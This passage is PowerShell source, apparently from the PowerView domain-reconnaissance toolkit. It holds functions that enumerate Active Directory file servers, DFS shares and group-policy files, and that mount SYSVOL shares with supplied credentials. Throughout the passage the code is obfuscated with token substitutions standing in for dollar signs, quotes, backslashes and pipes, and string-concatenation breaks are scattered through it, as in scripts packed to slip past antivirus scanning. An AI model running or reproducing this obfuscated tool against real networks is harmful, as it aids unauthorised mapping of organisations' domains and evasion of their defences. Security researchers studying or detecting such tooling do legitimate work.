License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

Returns a list of likely fileservers by searching for all users in Active Directory
with non-null homedirectory, scriptpath, '+'or profilepath fields, and extracting/uniquifying
the server names.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of altern'+'ate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainFileServer

Returns active file servers for the current domain.

.EXAMPLE

Get-DomainFileServer -Domain testing.local

Returns active file servers for the 41atesting.local41a domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainFileServer -Credential gIF1Cred

.OUTPUTS

String

One or more strings representing file server names.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainName41a, 41aName41a)]
        [String[]]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function Split-Path {
            # short internal helper to split UNC server paths
            Param([String]gIF1Path)

            if (gIF1Path -and (gIF1Path.split(41aYwWYwW41a).Count -ge 3)) {
                gIF1Temp = gIF1Path.split(41aYwWYwW41a)[2]
                if (gIF1Temp -and (gIF1Temp -ne 41a41a)) {
                    gIF1Temp
                }
            }
        }

        gIF1SearcherArguments = @{
            41aLDAPFilter41a = 41a(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(U9B(homedirectory=*)(scriptpath=*)(profilepath=*)))41a
            41aProperties41a = 41ahomedirectory,scriptpath,profilepath41a
        }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aDomain41a]) {
            ForEach (gIF1TargetDomain in gIF1Domain) {
                gIF1SearcherArguments[41aDomain41a] = gIF1TargetDomain
   '+'             gIF1UserSearcher = Get-DomainSearcher @SearcherArguments
                # get all results w/o the pipeline and uniquify them (I know it41as not pretty)
                gIF1(ForEach(gIF1UserResult in gIF1UserSearcher.FindAll()) {if (gIF1UserResult.Properties[41ahomedirectory41a]) {Split-Path(gIF1UserResult.Properties[41ahomedirectory41a])}if (gIF1UserResult.Properties[41ascriptpath41a]) {Split-Path(gIF1UserResult.Properties[41ascriptpath41a])}if (gIF1UserResult.Properties[41aprofilepath41a]) {Split-Path(gIF1UserResult.Properties[41aprofilepath41a])}}) U9B Sort-Object -Unique
            }
        }
        else {
            gIF1UserSearcher = Get-DomainSearcher @SearcherArguments
            gIF1(ForEach(gIF1UserResult in gIF1UserSearcher.FindAll()) {if (gIF1UserResult.Properties[41ahomedirectory41a]) {Split-Path(gIF1UserResult.Properties[41ahomedirectory41a])}if (gIF1UserResult.Properties[41ascriptpath41a]) {Split-Path(gIF1UserResult.Properties[41ascriptpath41a])}if (gIF1UserResult.Properties[41aprofilepath41a]) {Split-Path(gIF1UserResult.Properties[41aprofilepath41a])}}) U9B Sort-Object -Unique
        }
    }
}


function Get-DomainDFSShare {
<#
.SYNOPSIS

Returns a list of all fault-tolerant distributed file systems
for the current (or specified) domains.

Author: Ben Campbell (@meatballs__)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

This function searches for all distributed file systems (either version
1, 2, or both depending on -Version X) by searching for domain objects
matching (objectClass=fTDfs) or (objectClass=msDFS-Linkv2), respectively
The server data is parsed appropriately and returned.

.PARAMETER Domain

Specifies the domains to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDFSShare

Returns all distributed file system shares for the current domain.

.EXAMPLE

Get-DomainDFSShare -Domain testlab.local

Returns all distributed file system shares for the 41atestlab.local41a domain.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object Sy'+'stem.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-DomainDFSShare -Credential gIF1Cred

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject describing the distributed file systems.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseDeclaredVarsMoreThanAssignments41a, 41a41a)]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSUseApprovedVerbs41a, 41a41a)]
    [OutputType(41aSystem.Management.Automation.PSCustomObject41a)]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainName41a, 41aName41a)]
        [String[]]
        gIF1Domain,

        [ValidateN'+'otNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

  '+'      [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet(41aAll41a, 41aV141a, 41a141a, 41aV241a, 41a241a)]
        [String]
        gIF1Version = 41aAll41a
    )

    BEGIN {
        gIF1SearcherArguments = @{}
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }

        function Parse-Pkt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                gIF1Pkt
            )

            gIF1bin = gIF1Pkt
            gIF1blob_version = [bitconverter]::ToUInt32(gIF1bin[0..3],0)
            gIF1blob_element_count = [bitconverter]::ToUInt32(gIF1bin[4..7],0)
            gIF1offset = 8
            #https://msdn.microsoft.com/en-us/library/cc227147.aspx
            gIF1object_list = @()
            for(gIF1i=1; gIF1i -le gIF1blob_element_count; gIF1i++){
              '+'  gIF1blob_name_size_start = gIF1offset
                gIF1blob_name_size_end = gIF1offset + 1
            '+'    gIF1blob_name_size = [bitconverter]::ToUInt16(gIF1bin[gIF1blob_name_size_start..gIF1blob_name_size_end],0)

                gIF1blob_name_start = gIF1blob_name_size_end + 1
                gIF1blob_name_end = gIF1blob_name_start + gIF1blob_name_size - 1
                gIF1blob_name = [System.Text.Encoding]::Unicode.GetString(gIF1bin[gIF1blob_name_start..gIF1blob_name_end])

                gIF1blob_data_size_start = gIF1blob_name_end + 1
                gIF1blob_data_size_end = gIF1blob_data_size_start + 3
                gIF1blob_data_size = [bitconverter]::ToUInt32(gIF1bin[gIF1blob_data_size_start..gIF1blob_data_size_end],0)

                gIF1blob_data_start = gIF1blob_data_size_end + 1
                gIF1blob_data_end = gIF1blob_data_start + gIF1blob_data_size - 1
                gIF1blob_data = gIF1bin[gIF1blob_data_start..gIF1blob_data_end]
                switch -wildcard (gIF1blob_name) {
                    ZfrYwWsiterootZfr {  }
                    ZfrYwWdomainroot*Zfr {
                        # Parse DFSNamespaceRootOrLinkBlob object. Starts with variable length DFSRootOrLinkIDBlob which we parse first...
                        # DFSRootOrLinkIDBlob
                        gIF1root_or_link_guid_start = 0
                        gIF1root_or_link_guid_end = 15
                        gIF1root_or_link_guid = [byte[]]gIF1blob_data[gIF1root_or_link_guid_start..gIF1root_or_link_guid_end]
                        gIF1guid = New-Object Guid(,gIF1root_or_link_guid) # should match gIF1guid_str
                        gIF1prefix_size_start = gIF1root_or_link_guid_end + 1
                        gIF1prefix_size_end = gIF1prefix_size_start + 1
                        gIF1prefix_size = [bitconverter]::ToUInt16(gIF1blob_data[gIF1prefix_size_start..gIF1prefix_size_end],0)
                        gIF1prefix_start = gIF1prefix_size_end + 1
                        gIF1prefix_end = gIF1prefix_start + gIF1prefix_size - 1
                        gIF1prefix = [System.Text.Encoding]::Unicode.GetString(gIF1blob_data[gIF1prefix_start..gIF1prefix_end])

                        gIF1short_prefix_size_start = gIF1prefix_end + 1
                        gIF1short_prefix_size_end = gIF1short_prefix_size_start + 1
                        gIF1short_prefix_size = [bitconverter]::ToUInt16(gIF1blob_data[gIF1short_prefix_size_start..gIF1short_prefix_size_end],0)
                        gIF1short_prefix_start = gIF1short_prefix_size_end + 1
                        gIF1short_prefix_end = gIF1short_prefix_start + gIF1short_prefix_size - 1
                        gIF1short_prefix = [System.Text.Encoding]::Unicode.GetString(gIF1blob_data[gIF1short_prefix_start..gIF1short_prefix_end])

                        gIF1type_start = gIF1short_prefix_end + 1
                        gIF1type_end = gIF1type_start + 3
                        gIF1type = [bitconverter]::ToUInt32(gIF1blob_data[gIF1type_start..gIF1type_end],0)

                        gIF1state_start = gIF1type_end + 1
                        gIF1state_end = gIF1state_start + 3
                        gIF1state = [bitconverter]::ToUInt32(gIF1blob_data[gIF1state_start..gIF1state_end],0)

                        gIF1comment_size_start = gIF1state_end + 1
                        gIF1comment_size_end = gIF1comment_size_start + 1
                        gIF1comment_size = [bitconverter]::ToUInt16(gIF1bl'+'ob_data[gIF1comment_size_start..gIF1comment_size_end],0)
                        gIF1comment_start = gIF1comment_size_end + 1
                        gIF1comment_end = gIF1comment_start + gIF1comment_size - 1
                        if (gIF1comment_size -gt 0)  {
                            gIF1comment = [System.Text.Encoding]::Unicode.GetString(gIF1blob_data[gIF1comment_start..gIF1comment_end])
                        }
                        gIF1prefix_timestamp_start = gIF1comment_end + 1
                        gIF1prefix_timestamp_end = gIF1prefix_timestamp_start + 7
                        # https://msdn.microsoft.com/en-us/library/cc230324.aspx FILETIME
                        gIF1prefix_timestamp = gIF1blob_data[gIF1prefix_timestamp_start..gIF1prefix_timestamp_end] #dword lowDateTime #dword highdatetime
                        gIF1state_timestamp_start = gIF1prefix_timestamp_end + 1
                        gIF1state_timestamp_end = gIF1state_timestamp_start + 7
                        gIF1state_timestamp = gIF1blob_data[gIF1state_timestamp_start..gIF1state_timestamp_end]
                        gIF1comment_timestamp_start = gIF1state_timestamp_end + 1
                        gIF1comment_timestamp_end = gIF1comment_timestamp_start + 7
                        gIF1comment_timestamp = gIF1blob_data[gIF1comment_timestamp_start..gIF1comment_timestamp_end]
                        gIF1version_start = gIF1comment_timestamp_end  + 1
                        gIF1version_end = gIF1version_start + 3
                        gIF1version = [bitconverter]::ToUInt32(gIF1blob_data[gIF1version_start..gIF1version_end],0)

                        # Parse rest of DFSNamespaceRootOrLinkBlob here
                        gIF1dfs_targetlist_blob_size_start = gIF1version_end + 1
                        gIF1dfs_targetlist_blob_size_end = gIF1dfs_targetlist_blob_size_start + 3
                        gIF1dfs_targetlist_blob_size = [bitconverter]::ToUInt32(gIF1blob_data[gIF1dfs_targetlist_blob_size_start..gIF1dfs_targetlist_blob_size_end],0)

                        gIF1dfs_targetlist_blob_start = gIF1dfs_targetlist_blob_size_end + 1
                        gIF1dfs_targetlist_blob_end = gIF1dfs_targetlist_blob_start + gIF1dfs_targetlist_blob_size - 1
                        gIF1dfs_targetlist_blob = gIF1blob_data[gIF1dfs_targetlist_blob_start..gIF1dfs_targetlist_blob_end]
                        gIF1reserved_blob_size_start = gIF1dfs_targetlist_blob_end + 1
                        gIF1rese'+'rved_blob_size_end = gIF1reserved_blob_size_start + 3
                        gIF1reserved_blob_size = [bitconverter]::ToUInt32(gIF1blob_data[gIF1reserved_blob_size_start..gIF1reserved_blob_size_end],0)

                        gIF1reserved_blob_start = gIF1reserved_blob_size_end + 1
                        gIF1reserved_blob_end = gIF1reserved_blob_start + gIF1reserved_blob_size - 1
                        gIF1reserved_blob = gIF1blob_data[gIF1reserved_blob_start..gIF1reserved_blob_end]
                        gIF1referral_ttl_start = gIF1reserved_blob_end + 1
                        gIF1referral_ttl_end = gIF1referral_ttl_start + 3
                        gIF1referral_ttl = [bitconverter]::ToUInt32(gIF1blob_data[gIF1referral_ttl_start..gIF1referral_ttl_end],0)

                        #Parse DFSTargetListBlob
                        gIF1target_count_start = 0
                        gIF1target_count_end = gIF1target_count_start + 3
                        gIF1target_count = [bitconverter]::ToUInt32(gIF1dfs_targetlist_blob[gIF1target_count_start..gIF1target_count_end],0)
                        gIF1t_offset = gIF1target_count_end + 1

                        for(gIF1j=1; gIF1j -le gIF1target_count; gIF1j++){
                            gIF1target_entry_size_start = gIF1t_offset
                            gIF1target_entry_size_end = gIF1target_entry_size_start + 3
                            gIF1target_entry_size = [bitconverter]::ToUInt32(gIF1dfs_targetlist_blob[gIF1target_entry_size_start..gIF1target_entry_size_end],0)
                            gIF1target_time_stamp_start = gIF1target_entry_size_end + 1
                            gIF1target_time_stamp_end = gIF1target_time_stamp_start + 7
                            # FILETIME again or special if priority rank and priority class 0
                            gIF1target_time_stamp = gIF1dfs_targetlist_blob[gIF1target_time_stamp_start..gIF1target_time_stamp_end]
                            gIF1target_state_start = gIF1target_time_stamp_end + 1
                            gIF1target_state_end = gIF1target_state_start + 3
                            gIF1target_state = [bitconverter]::ToUInt32(gIF1dfs_targetlist_blob[gIF1target_state_start..gIF1target_state_end],0)

                            gIF1target_type_start = gIF1target_state_end + 1
                            gIF1target_type_end = gIF1target_type_start + 3
                            gIF1target_type = [bitconverter]::ToUInt32(gIF1dfs_targetlist_blob[gIF1target_type_start..gIF1target_type_end],0)

                            gIF1server_name_size_start = gIF1target_type_end + 1
                            gIF1server_name_size_end = gIF1server_name_size_start + 1
                            gIF1server_name_size = [bitconverter]::ToUInt16(gIF1dfs_targetlist_blob[gIF1server_name_size_start..gIF1server_name_size_end],0)

                            gIF1server_name_start = gIF1server_name_size_end + 1
                            gIF1server_name_end = gIF1server_name_start + gIF1server_name_size - 1
                            gIF1server_name = [System.Text.Encoding]::Unicode.GetString(gIF1dfs_targetlist_blob[gIF1server_name_start..gIF1server_name_end])

                            gIF1share_name_size_start = gIF1server_name_end + 1
                            gIF1share_name_size_end = gIF1share_name_size_start + 1
                            gIF1share_name_size = [bitconverter]::ToUInt16(gIF1dfs_targetlist_blob[gIF1share_name_size_start..gIF1share_name_size_end],0)
                            gIF1share_name_start = gIF1share_name_size_end + 1
                            gIF1share_name_end = gIF1share_name_start + gIF1share_name_size - 1
                            gIF1share_name = [System.Text.Encoding]::Unicode.GetString(gIF1dfs_targetlist_blob[gIF1share_name_start..gIF1share_name_end])

                            gIF1target_list += ZfrYwWYwWgIF1server_nameYwWgIF1share_nameZfr
                            gIF1t_offset = gIF1share_name_end + 1
                        }
                    }
                }
                gIF1offset = gIF1blob_data_end + 1
                gIF1dfs_pkt_properties = @{
                    41aName41a = gIF1blob_name
                    41aPrefix41a = gIF1prefix
                    41aTargetList41a = gIF1target_list
                }
                gIF1object_list += New-Object -TypeName PSObject -Property gIF1dfs_pkt_properties
                gIF1prefix = gIF1Null
                gIF1blob_name = gIF1Null
                gIF1target_list = gIF1Null
            }

            gIF1servers = @()
            gIF1object_list U9B ForEach-Object {
                if (gIF1_.TargetList) {
                    gIF1_.TargetList U9B ForEach-Object {
                      '+'  gIF1servers += gIF1_.split(41aYwW41a)[2]
                    }
                }
            }

            gIF1servers
        }

        function Get-DomainDFSShareV1 {
            [CmdletBinding()]
            Param(
                [String]
                gIF1Domain,

                [String]
                gIF1SearchBase,

                [String]
                gIF1Server,

                [String]
                gIF1SearchS'+'cope = 41aSubtree41a,

                [Int]
                gIF1ResultPageSize = 200,

                [Int]
                gIF1ServerTimeLimit,

                [Switch]
                gIF1Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                gIF1Credential = [Management.Automation.PSCredential]::Empty
            )

            gIF1DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if (gIF1DFSsearcher) {
                gIF1DFSshares = @()
                gIF1DFSsearcher.filter = 41a(&(objectClass=fTDfs))41a

                try {
                    gIF1Results = gIF1DFSSearcher.FindAll()
                    gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                        gIF1Properties = gIF1_.Properties
                        gIF1RemoteNames = gIF1Properties.remoteservername
                        gIF1Pkt = gIF1Properties.pkt

                        gIF1DFSshares += gIF1RemoteNames U9B ForEach-Object {
                            try {
                                if ( gIF1_.Contains(41aYwW41a) ) {
                                    New-Object -TypeName PSObject -Property @{41aName41a=gIF1Properties.name[0];41aRemoteServerName41a=gIF1_.split(41aYwW41a)[2]}
                                }
                            }
                            catch {
                                Write-Verbose Zfr[Get-DomainDFSShare] Get-DomainDFSShareV1 error in parsing DFS share : gIF1_Zfr
                            }
                        }
                    }
                    if (gIF1Results) {
                        try { gIF1Results.dispose() }
                        catch {
                            Write-Verbose Zfr[Get-DomainDFSShare] Get-DomainDFSShareV1 error disposing of the Results object: gIF1_Zfr
                        }
                    }
                    gIF1DFSSearcher.dispose()

                    if (gIF1pkt -and gIF1pkt[0]) {
                        Parse-Pkt gIF1pkt[0] U9B ForEach-Object {
                            # If a folder doesn41at have a redirection it will have a target like
                            # YwWYwWnullYwWTestNameSpaceYwWfolderYwW.DFSFolderLink so we do'+' actually want to match
                            # on 41anull41a rather than gIF1Null
                            if (gIF1_ -ne 41anull41a) {
                                New-Object -TypeName PSObject -Property @{41aName41a=gIF1Properties.name[0];41aRemoteServerName41a=gIF1_}
                            }
                        }
                    }
                }
                catch {
                    Write-Warning Zfr[Get-DomainDFSShare] Get-DomainDFSShareV1 error : '+'gIF1_Zfr
                }
                gIF1DFSshares U9B Sort-Object -Unique -Property 41aRemoteServerName41a
            }
        }

        function Get-DomainDFSShareV2 {
            [CmdletBinding()]
            Param(
                [String]
                gIF1Domain,

                [String]
                gIF1SearchBase,

                [String]
                gIF1Server,

                [String]
                gIF1SearchScope = 41aSubtree41a,

                [Int]
                gIF1ResultPageSize = 200,

                [Int]
                gIF1ServerTimeLimit,

                [Switch]
                gIF1Tombstone,

                [Management.Automation.PSCredential]
                [Management.Automation.CredentialAttribute()]
                gIF1Credential = [Management.Automation.PSCredential]::Empty
            )

            gIF1DFSsearcher = Get-DomainSearcher @PSBoundParameters

            if (gIF1DFSsearcher) {
                gIF1DFSshares = @()
                gIF1DFSsearcher.filter = 41a(&(objectClass=msDFS-Linkv2))41a
                gIF1Null = gIF1DFSSearcher.PropertiesToLoad.AddRange((41amsdfs-linkpathv241a,41amsDFS-TargetListv241a))

                try {
                    gIF1Results = gIF1DFSSearcher.FindAll()
                    gIF1Results U9B Where-Object {gIF1_} U9B ForEach-Object {
                        gIF1Properties = gIF1_.Properties
                        gIF1target_list = gIF1Properties.41amsdfs-targetlistv241a[0]
                        gIF1xml = [xml][System.Text.Encoding]::Unicode.GetString(gIF1target_list[2..(gIF1target_list.Length-1)])
                        gIF1DFSshares += gIF1xml.targets.ChildNodes U9B ForEach-Object {
                            try {
                                gIF1Target = gIF1_.InnerText
                                if ( gIF1Target.Contains(41aYwW41a) ) {
                                    gIF1DFSroot = gIF1Target.split(41aYwW41a)[3]
                                    gIF1ShareName = gIF1Properties.41amsdfs-linkpathv241a[0]
                                    New-Object -TypeName PSObject -Property @{41aName41a=ZfrgIF1DFSrootgIF1ShareNameZfr;41aRemoteServerName41a=gIF1Target.split(41aYwW41a)[2]}
                                }
                            }
                            catch {
                                Write-Verbose Zfr[Get-DomainDFSShare] Get-DomainDFSShareV2 error in parsing target : gIF1_Zfr
                            }
                        }
                    }
                    if (gIF1Results) {
                        try { gIF1Results.dispose() }
                        catch {
                            Write-Verbose Zfr[Get-DomainDFSShare] Error disposing of the Results object: gIF1_Zfr
                        }
                    }
                    gIF1DFSSearcher.dispose()
                }
                catch {
                    Write-Warning Zfr[Get-DomainDFSShare] Get-DomainDFSShareV2 error : gIF1_Zfr
                }
                gIF1DFSshares U9B Sort-Object -Unique -Property 41aRemoteServerName41a
            }
        }
    }

    PROCESS {
        gIF1DFSshares = @()

        if (gIF1PSBoundParameters[41aDomain41a]) {
            ForEach (gIF1TargetDomain in gIF1Domain) {
                gIF1SearcherArguments[41aDomain41a] = gIF1TargetDomain
                if (gIF1Version -match 41aallU9B141a) {
                    gIF1DFSshares '+'+= Get-DomainDFSShareV1 @SearcherArguments
                }
                if (gIF1Version -match 41aallU9B241a) {
                    gIF1DFSshares += Get-DomainDFSShareV2 @SearcherArguments
                }
            }
        }
        else {
            if (gIF1Version -match 41aallU9B141a) {
                gIF1DFSshares += Get-DomainDFSShareV1 @SearcherArguments
            }
            if (gIF1Version -match 41aallU9B241a) {
                gIF1DFSshares += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        gIF1DFSshares U9B Sort-Object -Property (41aRemoteServerName41a,41aName41a) -Unique
    }
}


########################################################
#
# GPO related functions.
#
########################################################

function Get-GptTmpl {
<#
.SYNOPSIS

Helper to parse'+' a GptTmpl.inf policy file path into a hashtable.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, Get-IniContent  

.DESCRIPTION

Parses a GptTmpl.inf into a custom hashtable using Get-IniContent. If a
GPO object is passed, GPOPATHYwWMACHINEYwWMicrosoftYwWWindows NTYwWSecEditYwWGptTmpl.inf
is constructed and assumed to be the parse target. If -Credential is passed,
Add-RemoteConnection is used to mount YwWYwWTARGETYwWSYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GptTmplPath

Specifies the GptTmpl.inf file path name to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-GptTmpl -GptTmplPath ZfrYwWYwWdev.testlab.localYwWsysvolYwWdev.testlab.localYwWPoliciesYwW{31B2F340-016D-11D2-945F-00C04FB984F9}YwWMACHINEYwWMicrosoftYwWWindows NTYwWSecEditYwWGptTmpl.infZfr

Parse the default domain policy .inf for dev.testlab.local

.EXAMPLE

Get-DomainGPO testing U9B Get-GptTmpl

Parse the GptTmpl.inf policy for the GPO with display name of 41atesting41a.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-GptTmpl -Credential gIF1Cred -GptTmplPath ZfrYwWYwWdev.testlab.localYwWsysvolYwWdev.testlab.localYwWPoliciesYwW{31B2F340-016D-11D2-945F-00C04FB984F9}YwWMACHINEYwWMicrosoftYwWWindows NTYwWSecEditYwWGptTmpl.infZfr

Parse the default domain policy .inf for dev.testlab.local using alternate credentials.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed GptTmpl.inf file.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = gIF1True, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41agpcfilesyspath41a, 41aPath41a)]
        [String]
        gIF1GptTmplPath,

        [Switch]
        gIF1OutputObject,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1MappedPaths = @{}
    }

    PROCESS {
        try {
            if ((gIF1GptTmplPath -Match 41aYwWYwWYwWYwW.*YwWYwW.*41a) -and (gIF1PSBoundParameters[41aCredential41a])) {
                gIF1SysVolPath = ZfrYwWYwWgIF1((New-Object System.Uri(gIF1GptTmplPath)).Host)YwWSYSVOLZfr
                if (-not gIF1MappedPaths[gIF1SysVolPath]) {
                    # map IPCgIF1 to this computer if it41as not already
                    Add-RemoteConnection -Path gIF1SysVolPath -Credential gIF1Credential
                    gIF1MappedPaths[gIF1SysVolPath] = gIF1True
                }
            }

            gIF1TargetGptTmplPath = gIF1GptTmplPath
            if (-not gIF1TargetGptTmplPath.EndsWith(41a.inf41a)) {
                gIF1TargetGptTmplPath += 41aYwWMACHINEYwWMicrosoftYwWWindows NTYwWSecEditYwWGptTmpl.inf41a
            }

            Write-Verbose Zfr[Get-GptTmpl] Parsing GptTmplPath: gIF1TargetGptTmplPathZfr

            if (gIF1PSBoundParameters[41aOutputObject41a]) {
                gIF1Contents = Get-IniContent -Path gIF1TargetGptTmplPath -OutputObject -ErrorAction Stop
                if (gIF1Contents) {
                    gIF1Contents U9B Add-Member Noteproperty 41aPath41a gIF1TargetGptTmplPath
                    gIF1Contents
                }
            }
            else {
                gIF1Contents = Get-IniContent -Path gIF1TargetGptTmplPath -ErrorAction Stop
                if (gIF1Contents) {
                    gIF1Contents[41aPath41a] = gIF1TargetGptTmplPath
                    gIF1Contents
                }
            }
        }
        catch {
            Write-Verbose Zfr[Get-GptTmpl] Error parsing gIF1TargetGptTmplPath : gIF1_Zfr
        }
    }

    END {
        # remove the SYSVOL mappings
        gIF1MappedPaths.Keys U9B ForEach-Object { Remove-RemoteConnection -Path gIF1_ }
    }
}


function Get-GroupsXML {
<#
.SYNOPSIS

Helper to parse a groups.xml file path into a custom object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection, ConvertTo-SID  

.DESCRIPTION

Parses a groups.xml into a custom object. If -Credential is passed,
Add-RemoteConnection is used to mount YwWYwWTARGETYwWSYSVOL with the specified creds,
the files are parsed, and the connection is destroyed later with Remove-RemoteConnection.

.PARAMETER GroupsXMLpath

Specifies the groups.xml file path name to parse.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.OUTPUTS

PowerView.GroupsXML
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.GroupsXML41a)]
    [CmdletBinding()]
    Param (
